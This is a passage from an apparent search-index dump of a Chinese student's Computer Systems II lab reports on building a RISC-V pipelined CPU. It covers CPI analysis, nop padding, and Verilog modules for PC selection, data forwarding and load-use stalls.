\u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part1\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI \u5bf9\u4e8e\u76ee\u524d\u7684\u6d41\u6c34\u7ebf CPU\uff0c\u5728 part1 \u90e8\u5206\uff0c\u901a\u8fc7\u4e0a\u9762\u7684\u6ce2\u5f62\u56fe\u53ef\u4ee5\u770b\u51fa\u8fd9 12 \u6761\u6307\u4ee4\u4e00\u5171\u8fd0\u884c\u4e86 16 \u4e2a\u5468\u671f\uff0c\u5176 CPI \u4e3a 16/12 = 1.33\u3002\u800c\u5728 lab0 \u4e2d\uff0cCPU \u4e3a\u5355\u5468\u671f\uff0c\u4e00\u4e2a\u5468\u671f\u4f1a\u8fd0\u884c\u4e00\u6761\u6307\u4ee4\uff0c\u6240\u4ee5\u5176 CPI \u4e3a 1\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u6d41\u6c34\u7ebf CPU \u7684 CPI \u662f\u4f1a\u5927\u4e8e\u5355\u5468\u671f CPU \u7684\uff0c\u4e14\u5f53\u8fd0\u884c\u6307\u4ee4\u6761\u6570\u8d8a\u591a\u65f6\uff0cCPI \u8d8a\u63a5\u8fd1\u5355\u5468\u671f\u7684 1\u3002 \u5bf9\u4e8e part2 (24-39 \u884c)\uff0c\u8bf7\u8ba1\u7b97\u4f60\u7684 CPU \u7684 CPI\uff08\u5047\u8bbe nop \u4e0d\u8ba1\u5165\u6307\u4ee4\u6761\u6570\uff09\uff0c\u518d\u7528 lab0 \u7684\u5355\u5468\u671f CPU \u8fd0\u884c part2\uff0c\u5bf9\u6bd4\u4e8c\u8005\u7684 CPI\u3002\u8bd5\u89e3\u91ca\u4e3a\u4f55\u9700\u8981\u6dfb\u52a0 nop \u6307\u4ee4 \u4ece\u4e0a\u6ce2\u5f62\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0cpart2 \u7684\u8fd9\u4e9b\u6307\u4ee4\u8fd0\u884c\u4e86 20 \u4e2a\u5468\u671f\uff0c\u9664\u53bb nop \u4ee5\u5916\u4e00\u5171\u56db\u6761\u6307\u4ee4\uff0cCPI \u4e3a 20/4 = 5\u3002\u800c lab0 \u4e2d\u7684 CPU \u4e3a\u5355\u5468\u671f\uff0c\u8fd0\u884c part2 \u7684\u8fd9\u4e9b\u6307\u4ee4\u9700\u8981 16 \u4e2a\u5468\u671f\uff0c\u6709\u6548 4 \u6761\uff0cCPI \u4e3a 16/4 = 4\uff08\u5982\u679c\u8fd0\u884c\u65f6\u9664\u53bb nop \u6307\u4ee4\uff0c\u5219 CPI \u4e3a 1\uff09\u3002\u53d1\u73b0\u6b64\u65f6\u6d41\u6c34\u7ebf CPU \u7684 CPI \u662f\u8981\u5927\u4e8e\u5355\u5468\u671f\u7684\u3002 \u6dfb\u52a0 nop \u6307\u4ee4\u7684\u539f\u56e0\u662f\u6b64\u65f6\u4f1a\u51fa\u73b0\u6570\u636e\u5192\u9669\uff0c\u5373\u5728\u6267\u884c\u7b2c\u4e00\u6761\u6307\u4ee4\u65f6\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u9700\u8981\u7528\u5230\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u7b2c\u4e00\u6761\u6307\u4ee4\u8fd8\u6ca1\u6709\u6267\u884c\u5b8c\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u5f85\u7b2c\u4e00\u6761\u6307\u4ee4\u6267\u884c\u5b8c\uff0c\u624d\u80fd\u6267\u884c\u7b2c\u4e8c\u6761\u6307\u4ee4\u3002\u5e76\u4e14\u76ee\u524d\u7684\u6d41\u6c34\u7ebf CPU \u4e2d\u6ca1\u6709\u8fdb\u884c\u6570\u636e\u5192\u9669\u7684\u5904\u7406\uff0c\u6240\u4ee5\u9700\u8981\u9760\u6dfb\u52a0 nop \u6307\u4ee4\u6765\u624b\u52a8\u6682\u505c\u907f\u514d\u5192\u9669\u3002","title":"\u601d\u8003\u9898"},{"location":"cs/system/cs2/lab1/#cpu_1","text":"","title":"\u5b8c\u6574\u6d41\u6c34\u7ebf CPU"},{"location":"cs/system/cs2/lab1/#_7","text":"\u5728\u524d\u9762\u7684\u7b80\u5316\u6570\u636e\u901a\u8def\u57fa\u7840\u4e0a\u8fdb\u884c\u66f4\u6539\uff0c\u9700\u8981\u4fee\u6539\u7684\u4ec5\u662f\u4e3a pc \u8d4b\u503c\u7684\u90e8\u5206\u3002\u91c7\u7528\u4e86\u548c lab0 \u4e2d\u76f8\u540c\u7684\u7528\u4e8e pc \u7684\u591a\u8def\u9009\u62e9\u5668\uff0c\u5176\u7ed3\u6784\u4e3a\uff1a input [ 31 : 0 ] I0 , // pc+4 input [ 31 : 0 ] I1 , // jalr \u7684\u5730\u5740 input [ 31 : 0 ] I2 , // jal \u7684\u5730\u5740 input [ 31 : 0 ] I3 , // branch \u7684\u5730\u5740\uff0c\u548c jal \u76f8\u540c input [ 1 : 0 ] s , // pc_src \u63a7\u5236\u4fe1\u53f7 input branch , // branch \u63a7\u5236\u4fe1\u53f7\uff08\u662f\u5426\u662f branch \u8bed\u53e5\uff09 input b_type , // b_type \u63a7\u5236\u4fe1\u53f7\uff080 \u8868\u793a bne\uff0c\u53cd\u4e4b beq\uff09 input [ 31 : 0 ] alu_res , // alu \u7684\u7ed3\u679c\uff08\u4f5c\u7528\u76f8\u5f53\u4e8e alu_zero\uff09 output [ 31 : 0 ] o // pc_next \u5728\u6b64\u5904 jalr/jal/branch \u7684\u5730\u5740\u90fd\u9700\u8981\u5230\u8fbe MEM \u9636\u6bb5\u624d\u53ef\u4ee5\u8ba1\u7b97\uff0c\u51e0\u4e2a\u63a7\u5236\u4fe1\u53f7\u4e5f\u662f\u5728 MEM \u9636\u6bb5\u7684\uff0c\u4e3a\u4e86\u9632\u6b62\u7b49\u5f85\uff0cpc+4 \u4e2d\u7684 pc \u4e0d\u5e94\u8be5\u662f MEM \u9636\u6bb5\u7684 pc\uff0c\u800c\u662f\u5f53\u524d\u65f6\u523b pc \u5bc4\u5b58\u5668\u4e2d\u7684 pc\uff0cpc_next \u4e5f\u4f1a\u76f4\u63a5\u5728\u4e0b\u4e00\u4e2a\u4e0a\u5347\u6cbf\u8d4b\u503c\u7ed9 pc\u3002\u56e0\u6b64\u9700\u8981\u4fdd\u8bc1\u9664\u4e86\u8df3\u8f6c\u4ee5\u5916\u7684\u5176\u5b83\u65f6\u523b\uff0cs\u3001branch \u7b49\u4fe1\u53f7\u90fd\u4e3a 0\uff08\u5373\u9009\u62e9 pc+4 \u4f5c\u4e3a pc_next\uff09\u3002\u800c\u4e00\u6761\u5305\u542b\u8df3\u8f6c\u7684\u6307\u4ee4\u8fd0\u884c\u5230 MEM \u65f6\uff0c\u4f1a\u6539\u53d8\u8fd9\u4e9b\u4fe1\u53f7\uff0c\u4ece\u800c\u5f71\u54cd pc_next\uff0c\u5b9e\u73b0\u8df3\u8f6c\u3002\u57fa\u4e8e\u6b64\u601d\u8def\uff0c\u6570\u636e\u901a\u8def\u4e3a\uff1a","title":"\u6570\u636e\u901a\u8def"},{"location":"cs/system/cs2/lab1/#_8","text":"\u9996\u5148\u9700\u8981\u5220\u6389\u524d\u9762\u5199\u7684 assign pc_next = pc+4; \u7136\u540e\u589e\u52a0\u521b\u5efa\u5e76\u8fde\u63a5 MuxPC \u6a21\u5757\uff1a wire [ 31 : 0 ] jal_addr , jalr_addr ; //--------------------MEM--------------------// assign addr_out = EX_MEM_alu_result ; assign data_out = EX_MEM_data2 ; assign mem_write = EX_MEM_mem_write ; assign jal_addr = EX_MEM_pc + EX_MEM_imm ; assign jalr_addr = EX_MEM_alu_result ; MuxPC mux_pc ( . I0 ( pc + 4 ), . I1 ( jalr_addr ), . I2 ( jal_addr ), . I3 ( jal_addr ), . s ( EX_MEM_pc_src ), . branch ( EX_MEM_branch ), . b_type ( EX_MEM_b_type ), . alu_res ( EX_MEM_alu_result ), . o ( pc_next ) ); \u8fd9\u6837\u6574\u4e2a\u6d41\u6c34\u7ebf CPU \u5c31\u5b8c\u6210\u4e86\u3002\u5b8c\u6574\u4ee3\u7801\u89c1\u9644\u4ef6\u3002","title":"\u4ee3\u7801\u5b9e\u73b0"},{"location":"cs/system/cs2/lab1/#_9","text":"\u56e0\u4e3a\u5728 lab0 \u4e2d\u5df2\u7ecf\u5b8c\u6210\u4e86 bonus \u6307\u4ee4\uff0c\u5305\u542b\u4e86\u672c\u5b9e\u9a8c\u4e2d\u7684\u6240\u6709\u6307\u4ee4\uff0c\u6240\u4ee5\u76f4\u63a5\u8f7d\u5165 coe \u6587\u4ef6\u8fd0\u884c\u5373\u53ef\uff0c\u4eff\u771f\u6ce2\u5f62\u5982\u4e0b\uff1a","title":"\u4eff\u771f\u6d4b\u8bd5"},{"location":"cs/system/cs2/lab1/#_10","text":"\u7b2c\u4e00\u90e8\u5206\uff0c\u6b63\u5e38\u8fd0\u884c\u4e86\u4e00\u4e9b\u8ba1\u7b97\u6307\u4ee4\uff0c\u7ed3\u679c\u5747\u6b63\u786e\u3002\u5e76\u4e14\u51e0\u4e2a bne \u8df3\u8f6c\u672a\u8fbe\u5230\u6761\u4ef6\u6ca1\u6709\u8df3\u8f6c\u3002 \u7b2c\u4e8c\u90e8\u5206\uff0c\u4e3b\u8981\u662f\u8df3\u8f6c\uff0cslli \u6307\u4ee4\u540e\u9762\u63a5\u4e09\u4e2a nop\uff0c\u7136\u540e\u662f jalr \u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff0c\u5176\u4e2d MEM \u9636\u6bb5\u540e\u66f4\u6539\u4e86 pc\uff0cWB \u9636\u6bb5\u540e\u5c06\u8be5\u6307\u4ee4 pc \u52a0 4 \u540e\u5b58\u5165\u4e86 x1 \u5bc4\u5b58\u5668\u4e2d\u3002\u7136\u540e\u662f\u4e00\u4e9b nop \u6307\u4ee4\u9632\u6b62\u526f\u4f5c\u7528\uff08\u6b64\u5904\u53ea\u6267\u884c\u4e86\u4e09\u4e2a\uff09\uff0cpc \u8df3\u8f6c\u5230\u4e86 244\uff08\u5373 addi \u6307\u4ee4\u7684\u4f4d\u7f6e\uff09\uff0c\u6267\u884c\u4e86 addi \u6307\u4ee4\u540e\u6709\u4e09\u4e2a nop\uff0c\u4e00\u4e2a\u672a\u6210\u529f bne\uff0c\u4e94\u4e2a nop\uff0c\u4e4b\u540e\u8fd0\u884c\u5230\u4e86 j pass \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u53cd\u590d\u8df3\u5230\u5f53\u524d\u4f4d\u7f6e\uff0c\u5728\u4e0b\u56fe\u4e2d\u4e5f\u80fd\u6e05\u6670\u5730\u770b\u5230\u6709 pc \u8df3\u8f6c\u63a5 3 \u4e2a nop \u7684\u5faa\u73af\uff1a \u901a\u8fc7\u4ee5\u4e0a\u5206\u6790\uff0c\u53ef\u89c1\u8fd0\u884c\u662f\u6b63\u786e\u7684\u3002","title":"\u6ce2\u5f62\u5206\u6790"},{"location":"cs/system/cs2/lab1/#_11","text":"\u9700\u8981\u4fee\u6539\u4e00\u4e2a\u5730\u65b9\u7528\u6765 debug\uff0c\u5373\u5c06 SCPU \u7684 debug_reg_addr \u8f93\u5165\u5230 Regs \u4e2d\uff0c\u7136\u540e\u8f93\u51fa debug_reg\uff0c\u4f20\u5165\u4e0a\u7ea7 Core \u4e2d\uff0c\u6765\u67e5\u770b\u67d0\u4e00\u5bc4\u5b58\u5668\u7684\u503c\u3002 Regs regs ( ... . debug_reg_addr ( debug_reg_addr ), . debug_reg ( debug_reg ) ) \u5176\u5b83\u529f\u80fd\uff08\u770b pc\u3001addr_out\u3001inst\uff0c\u4ee5\u53ca\u6839\u636e\u5f00\u5173\u8bbe\u7f6e debug_reg_addr\uff09\u5df2\u7ecf\u5728 lab0 \u4e2d\u5b9e\u73b0\uff0c\u8fd9\u91cc\u4fdd\u7559\u5373\u53ef\u3002 \u4e0a\u677f\u540e\u9010\u5468\u671f\u8c03\u8bd5\u8fd0\u884c\uff0c\u5747\u548c\u6ce2\u5f62\u4e00\u81f4\uff0c\u7ed3\u679c\u6b63\u786e\u3002","title":"\u4e0a\u677f\u9a8c\u8bc1"},{"location":"cs/system/cs2/lab1/#_12","text":"\u5728\u4f60\u7684\u8bbe\u8ba1\u4e2d\uff0c\u672c\u5b9e\u9a8c\u6d4b\u8bd5\u6587\u4ef6\u4e2d\u7684 nop \u6570\u91cf\u662f\u5426\u591a\u4e8e\u6bcf\u6761\u6307\u4ee4\u6240\u9700\u7684\u5ef6\u8fdf\u5468\u671f\u6570\uff1f \u591a\u4e8e\u4e86\uff0c\u5bf9\u4e8e\u6211\u7684\u8bbe\u8ba1\u6765\u8bf4\uff0c\u5728\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762\u53ea\u9700\u8981\u63a5 3 \u4e2a nop \u6307\u4ee4\u5c31\u53ef\u4ee5\u9632\u6b62\u5176\u540e\u7684\u6307\u4ee4\u5728\u8df3\u8f6c\u524d\u88ab\u6267\u884c\uff08\u8be6\u89c1\u4e0a\u9762\u6ce2\u5f62\u5206\u6790\uff09\uff0c\u4f46\u662f\u5728\u6d4b\u8bd5\u6587\u4ef6\u4e2d\uff0c\u6bcf\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762\u90fd\u63a5\u4e86 5 \u4e2a nop \u6307\u4ee4\uff0c\u8fd9\u6837\u5c31\u591a\u4e86 2 \u4e2a\u5ef6\u8fdf\u5468\u671f\u3002 \u53c8\u662f\u5426\u5b58\u5728\u51fa\u73b0\u51b2\u7a81\u4f46\u662f\u6ca1\u6709\u7ed9\u8db3 nop \u7684\u60c5\u51b5\uff1f \u4e0d\u5b58\u5728 \u8bf7\u8ba1\u7b97\u6bcf\u6761\u6307\u4ee4\u95f4\u5b9e\u9645\u6240\u9700\u8981\u7684 nop \u6570\u91cf\uff0c\u5e76\u5bf9\u4f60\u7684 coe \u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u4e4b\u6b63\u786e\u5730\u8fd0\u884c\u51fa\u76f8\u5e94\u7684\u7ed3\u679c \u9700\u8981\u4fee\u6539\u7684\u53ea\u662f\u5404\u4e2a\u8df3\u8f6c\u6307\u4ee4\u540e\u9762 nop \u7684\u4e2a\u6570\uff0c\u4ece 5 \u4e2a\u4fee\u6539\u5230 3 \u4e2a\uff0c\u5176\u4ed6\u6307\u4ee4\u4e0d\u9700\u8981\u4fee\u6539\u3002\u4ecd\u53ef\u4ee5\u6b63\u786e\u8fd0\u884c\u3002","title":"\u601d\u8003\u9898"},{"location":"cs/system/cs2/lab2/","text":"\u6d41\u6c34\u7ebf\u5192\u9669\u5904\u7406 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 lab2 \u5b9e\u9a8c\u62a5\u544a\uff082022.10.08 ~ 2022.10.27\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad \u5b9e\u9a8c\u5185\u5bb9 \u00b6 lab 2-1\uff1a\u6682\u505c\u4e0e\u5192\u9669 \u5728 lab 1 \u7684\u57fa\u7840\u4e0a\u52a0\u5165 stall \u673a\u5236\u5904\u7406\u6570\u636e\u5192\u9669\u548c\u63a7\u5236\u5192\u9669 \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u57fa\u672c\u529f\u80fd \u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5\uff0c\u68c0\u9a8c CPU \u8bbe\u8ba1\u89c4\u8303 \u601d\u8003\u9898 \u8bf7\u4f60\u5bf9\u6570\u636e\u51b2\u7a81\u60c5\u51b5\u8fdb\u884c\u5206\u6790\u5f52\u7eb3\uff0c\u8bd5\u7740\u5c06\u4ed6\u4eec\u5206\u7c7b\u5217\u51fa\u3002 \u5982\u679c EX, MEM, WB \u6bb5\u4e2d\u4e0d\u6b62\u4e00\u4e2a\u6bb5\u7684\u5199\u5bc4\u5b58\u5668\u4e0e ID \u6bb5\u7684\u8bfb\u5bc4\u5b58\u5668\u53d1\u751f\u4e86\u51b2\u7a81\uff0c\u8be5\u5982\u4f55\u5904\u7406\uff1f lab 2-2\uff1a\u65c1\u8def\u4f18\u5316 Forwarding \u5728 lab 2-1 \u57fa\u7840\u4e0a\u5b9e\u73b0 Forwarding \u673a\u5236 \u8fdb\u884c\u4eff\u771f\u6d4b\u8bd5\u548c\u4e0a\u677f\u6d4b\u8bd5 \u601d\u8003\u9898 \u5728\u5f15\u5165 Forwarding \u673a\u5236\u540e\uff0c\u662f\u5426\u610f\u5473\u7740 stall \u673a\u5236\u5c31\u4e0d\u518d\u9700\u8981\u4e86\uff1f\u4e3a\u4ec0\u4e48\uff1f \u4f60\u8ba4\u4e3a Forwarding \u673a\u5236\u5728\u5b9e\u9645\u7684\u7535\u8def\u8bbe\u8ba1\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u5b9a\u7684\u5f0a\u7aef\uff1f\u5982\u679c\u5b58\u5728\uff0c\u8bf7\u7ed9\u51fa\u4f60\u7684\u7406\u7531\u3002 \u672c\u62a5\u544a\u6ca1\u6709\u6309\u7167\u4e24\u4e2a lab \u7684\u987a\u5e8f\u8fdb\u884c\uff0c\u800c\u662f\u4ee5\u5177\u4f53\u8fdb\u884c\u4fee\u6539\u7684\u987a\u5e8f\u8fdb\u884c\u7684\uff08\u5148\u5904\u7406\u6570\u636e\u5192\u9669\uff0c\u7136\u540e\u5904\u7406\u63a7\u5236\u5192\u9669\uff0c\u6700\u540e\u5904\u7406\u5728\u5b9e\u9645\u8fd0\u884c\u65f6\u9047\u5230\u7684\u5176\u5b83\u5192\u9669\u95ee\u9898\uff09\u3002 \u6570\u636e\u5192\u9669 Forwarding \u673a\u5236 \u00b6 \u548c\u4e0a\u8bfe/\u4e66\u4e0a\u8bb2\u7684\u4e00\u6837\uff0c\u901a\u8fc7\u4e00\u4e2a ForwardingUnit \u6765\u8ba1\u7b97\u662f\u5426\u9700\u8981\u524d\u9012\uff0c\u7136\u540e\u901a\u8fc7\u591a\u8def\u9009\u62e9\u5668\u9009\u62e9\u51fa\u4f20\u5165 ALU \u7684\u7ed3\u679c\u3002 \u5728\u6b64\u57fa\u7840\u4e0a\u9700\u8981\u4e00\u4e9b\u6539\u8fdb\u7684\u662f\uff0c\u5728\u6211\u7684 CPU \u4e2d\uff0cALU \u7684\u4e24\u4e2a\u8f93\u5165\u90fd\u5df2\u7ecf\u9700\u8981\u5148\u9009\u62e9\uff08\u4e00\u4e2a\u901a\u8fc7 auipc \u9009\u62e9 PC \u8fd8\u662f\u5bc4\u5b58\u5668\u503c\uff0c\u4e00\u4e2a\u901a\u8fc7 alu_src \u9009\u62e9\u5bc4\u5b58\u5668\u503c\u8fd8\u662f\u7acb\u5373\u6570\uff09\uff0c\u6240\u4ee5 ForwardingUnit \u8fd8\u9700\u8981\u63a5\u6536 auipc\u3001alu_src \u4e24\u4e2a\u4fe1\u53f7\uff0c\u5982\u679c auipc \u4e3a 1 \u5219\u8be5\u4fa7\u4e0d\u4f1a\u4f7f\u7528\u5bc4\u5b58\u5668\u503c\uff0c\u4e5f\u5c31\u4e0d\u6d89\u53ca\u5230\u6570\u636e\u5192\u9669\uff0calu_src \u4e5f\u540c\u7406\u3002\u8fd9\u6837\u8f93\u51fa\u7684\u503c\u6709\u56db\u79cd\u60c5\u51b5\uff0c\u5177\u4f53\u89c1\u4e0b\u9762\u4ee3\u7801\u6ce8\u91ca\uff1a module ForwardingUnit ( input [ 4 : 0 ] EX_MEM_rd , input [ 4 : 0 ] MEM_WB_rd , input [ 4 : 0 ] ID_EX_rs1 , input [ 4 : 0 ] ID_EX_rs2 , input EX_MEM_reg_write , input MEM_WB_reg_write , input auipc , input alu_src_b , output reg [ 1 : 0 ] ForwardA , // 00 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c01 \u6765\u81ea EX/MEM\uff0c10 \u6765\u81ea MEM/WB\uff0c11 \u6765\u81ea PC output reg [ 1 : 0 ] ForwardB // 00 \u6765\u81ea\u5bc4\u5b58\u5668\uff0c01 \u6765\u81ea EX/MEM\uff0c10 \u6765\u81ea MEM/WB\uff0c11 \u6765\u81ea imm ); always @( * ) begin if ( auipc ) assign ForwardA = 2 'b11 ; else begin if ( EX_MEM_reg_write == 1 && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs1 ) assign ForwardA = 2 'b01 ; else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs1 ) assign ForwardA = 2 'b10 ; else assign ForwardA = 2 'b00 ; end if ( alu_src_b ) assign ForwardB = 2 'b11 ; else begin if ( EX_MEM_reg_write == 1 && EX_MEM_rd != 0 && EX_MEM_rd == ID_EX_rs2 ) assign ForwardB = 2 'b01 ; else if ( MEM_WB_reg_write == 1 && MEM_WB_rd != 0 && MEM_WB_rd == ID_EX_rs2 ) assign ForwardB = 2 'b10 ; else assign ForwardB = 2 'b00 ; end end endmodule \u6b64\u5916\u9700\u8981\u4e00\u4e9b wire \u548c reg\uff1a wire [ 2 : 0 ] forwardA , forwardB ; reg [ 4 : 0 ] ID_EX_rs1 , ID_EX_rs2 ; // \u65f6\u5e8f\u66f4\u65b0\uff1a ID_EX_rs1 <= IF_ID_inst [ 19 : 15 ]; ID_EX_rs2 <= IF_ID_inst [ 24 : 20 ]; \u4ee5\u53ca\u6700\u540e\u8fde\u7ebf\u9009\u62e9 ALU \u8f93\u5165\uff1a ForwardingUnit forwarding ( . EX_MEM_rd ( EX_MEM_write_addr ), . MEM_WB_rd ( MEM_WB_write_addr ), . ID_EX_rs1 ( ID_EX_rs1 ), . ID_EX_rs2 ( ID_EX_rs2 ), . EX_MEM_reg_write ( EX_MEM_reg_write ), . MEM_WB_reg_write ( MEM_WB_reg_write ), . auipc ( ID_EX_auipc ), . alu_src_b ( ID_EX_alu_src ), . ForwardA ( forwardA ), . ForwardB ( forwardB ), ); Mux4x32 mux_alu_a ( . I0 ( ID_EX_data1 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), // WB \u6bb5\u9009\u62e9\u51fa\u6765\u7684\u5199\u56de\u5bc4\u5b58\u5668\u7684\u6570\u636e . I3 ( ID_EX_pc ), . s ( forwardA ), . o ( alu_data1 ) ); Mux4x32 mux_alu_b ( . I0 ( ID_EX_data2 ), . I1 ( EX_MEM_alu_result ), . I2 ( write_data ), . I3 ( ID_EX_imm ), . s ( forwardB ), . o ( alu_data2 ) ); Double bump \u673a\u5236 \u00b6 \u6839\u636e\u6307\u5bfc\uff0c\u4e3a\u4e86\u89e3\u51b3\u540c\u4e00\u4e2a\u5468\u671f\u5185\u5199\u5165 reg \u540e\u8bfb\u7684\u5192\u9669\u60c5\u51b5\uff0c\u9700\u8981\u4f7f\u7528 double bump \u673a\u5236\u3002\u5728\u5bc4\u5b58\u5668\u7ec4\u7684\u5b9a\u4e49\u4e2d\uff0c\u8bfb\u53d6\u7684\u7ed3\u679c\u662f\u76f4\u63a5 assign \u7684\uff0c\u800c\u5199\u5165\u624d\u662f\u65f6\u5e8f\u903b\u8f91\uff0c\u6240\u4ee5\u53ea\u8981\u8ba9\u5bc4\u5b58\u5668\u7ec4\u5728 CPU \u7684\u4e00\u4e2a\u5468\u671f\u4e2d\u5b8c\u6210\u5199\u5165\u5373\u53ef\uff08\u800c\u4e0d\u662f\u5728\u4e0b\u4e00\u4e2a\u5468\u671f\u5f00\u59cb\u7684\u4e0a\u5347\u6cbf\u5199\u5165\uff09\u3002\u8fd9\u6837\u6765\u8bf4\u53ea\u8981\u5c06\u5bc4\u5b58\u5668\u7ec4\u7684\u5199\u5165\u89e6\u53d1\u6539\u4e3a\u4e0b\u964d\u6cbf\uff08negedge\uff09\u5373\u53ef\uff1a always @( negedge clk or posedge rst ) begin if ( rst == 1 ) for ( i = 1 ; i < 32 ; i = i + 1 ) register [ i ] <= 0 ; // reset else if ( we == 1 && write_addr != 0 ) register [ write_addr ] <= write_data ; end Stall \u673a\u5236 \u00b6 \u5bf9\u4e8e load-use \u7c7b\u6570\u636e\u5192\u9669\uff0c\u4ec5 forwarding \u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u518d stall \u4e00\u4e2a\u5468\u671f\u624d\u53ef\u4ee5 forwarding\u3002 \u5982\u4e0a\u56fe\uff0c\u9700\u8981\u5728\u6bcf\u6761\u6307\u4ee4\u8fdb\u5165 ID \u9636\u6bb5\u540e\u8fdb\u884c\u9a8c\u8bc1\uff0c\u9a8c\u8bc1\u8fd9\u65f6\u5904\u4e8e EX \u9636\u6bb5\u7684\u6307\u4ee4\u662f\u4e0d\u662f load \u6307\u4ee4\uff08\u662f\u5426\u53d1\u751f\u4e86 D-Mem \u7684\u6570\u636e\u8bfb\u53d6\uff09\u7136\u540e\u68c0\u6d4b\u662f\u5426\u4e0e\u5f53\u524d\u6307\u4ee4\u6709\u6570\u636e\u51b2\u7a81\u3002\u5982\u679c\u6709\u51b2\u7a81\u5219\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f\uff0c\u5177\u4f53\u4e3a\uff1a EX/MEM \u4e0e MEM/WB \u9636\u6bb5\u4ecd\u6b63\u5e38\u6267\u884c\u6d41\u8f6c \u5c06\u5f53\u524d\u7684 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u4e2d\u63a7\u5236\u4fe1\u53f7\u7f6e 0\uff0c\u5373\u76f8\u5f53\u4e8e\u63d2\u5165 bubble \u963b\u6b62 IF/ID \u9636\u6bb5\u5bc4\u5b58\u5668\u548c PC \u7684\u65f6\u5e8f\u66f4\u65b0\uff0c\u5b9e\u73b0\u6682\u505c \u9996\u5148\u9700\u8981\u6dfb\u52a0\u4e00\u4e2a mem_read \u63a7\u5236\u4fe1\u53f7\u6765\u5224\u65ad\u662f\u5426\u53d1\u751f\u4e86\u6570\u636e\u8bfb\u53d6\uff08\u4e0d\u53ef\u4ee5\u901a\u8fc7 mem_write \u5224\u65ad\uff0c\u56e0\u4e3a mem_write \u4e3a 0 \u53ef\u80fd\u4e5f\u4e0d\u4f1a\u4f7f\u7528\u8bfb\u53d6\u7684\u6570\u636e\uff09\uff1a module Control ( ... output reg mem_read ); `include \"AluOp.vh\" always @( * ) begin ... mem_read = 0 ; case ( op_code ) 7 'b0000011 : begin // lw ... mem_read = 1 ; end ... endcase end endmodule \u7136\u540e\u540c\u7406\u5728 CPU \u4e2d\u521b\u5efa wire mem_read \u7528\u4e8e\u63a5\u6536\u5f53\u524d Control \u7684\u8f93\u51fa\uff0c\u7136\u540e\u901a\u8fc7\u65f6\u5e8f\u8d4b\u503c\u7ed9 reg ID_EX_mem_read \u5bc4\u5b58\u5668\u3002\u4e4b\u540e\u9700\u8981\u4e00\u4e2a StallUnit \u6765\u5224\u65ad\u662f\u5426\u9700\u8981\u6682\u505c\uff1a module StallUnit ( input ID_EX_mem_read , input [ 4 : 0 ] ID_EX_rd , input [ 4 : 0 ] IF_ID_rs1 , input [ 4 : 0 ] IF_ID_rs2 , output bubble_stop ); assign bubble_stop = ID_EX_mem_read && ( ID_EX_rd == IF_ID_rs1 || ID_EX_rd == IF_ID_rs2 ); endmodule \u8fde\u63a5\uff1a wire bubble_stop ; StallUnit stallunit ( . ID_EX_mem_read ( ID_EX_mem_read ), . ID_EX_rd ( ID_EX_write_addr ), . IF_ID_rs1 ( IF_ID_inst [ 19 : 15 ]), . IF_ID_rs2 ( IF_ID_inst [ 24 : 20 ]), . bubble_stop ( bubble_stop ) ); \u7136\u540e\u5728\u65f6\u5e8f\u66f4\u65b0\u90e8\u5206\u5224\u65ad bubble_stop \u662f\u5426\u4e3a 1\uff0c\u5982\u679c\u4e3a 1 \u5219\u8fdb\u884c\u7279\u6b8a\u5904\u7406\uff08\u4e0d\u66f4\u65b0 pc \u548c IF/ID\uff0c\u4e3a ID/EX \u63a7\u5236\u4fe1\u53f7\u8d4b 0\uff09\uff1a always @( posedge clk or posedge rst ) begin if ( rst ) begin ... end else begin if ( bubble_stop ) begin ID_EX_alu_op <= 4 'b0 ; ID_EX_pc_src <= 2 'b0 ; ID_EX_mem_to_reg <= 2 'b0 ; ID_EX_reg_write <= 1 'b0 ; ID_EX_alu_src <= 1 'b0 ; ID_EX_branch <= 1 'b0 ; ID_EX_b_type <= 1 'b0 ; ID_EX_auipc <= 1 'b0 ; ID_EX_mem_write <= 1 'b0 ; ID_EX_mem_read <= 1 'b0 ; end else begin pc <= pc_next ; IF_ID_pc <= pc ; IF_ID_inst <= inst ; ID_EX_pc_src <= pc_src ; ID_EX_mem_to_reg <= mem_to_reg ; ID_EX_reg_write <= reg_write ; ID_EX_alu_src <= alu_src ; ID_EX_branch <= branch ; ID_EX_b_type <= b_type ; ID_EX_auipc <= auipc ; ID_EX_alu_op <= alu_op ; ID_EX_mem_write <= mem_write_ ; ID_EX_mem_read <= mem_read ; end // update of EX/MEM and MEM/WB end end \u6d4b\u8bd5 \u00b6 \u4ece\u7ed9\u51fa\u7684\u6c47\u7f16\u4e2d\u6311\u53d6\u4e86\u4e00\u5c0f\u90e8\u5206\u7528\u6765\u6d4b\u8bd5\u524d\u9762\u5904\u7406\u8fc7\u7684\u6570\u636e\u5192\u9669\uff1a addi x1 , x0 , 1 addi x2 , x0 , 1 addi x4 , x0 , 5 add x3 , x1 , x2 add x1 , x2 , x3 add x2 , x1 , x3 ld x4 , 0 ( x2 ) addi x4 , x4 , -1 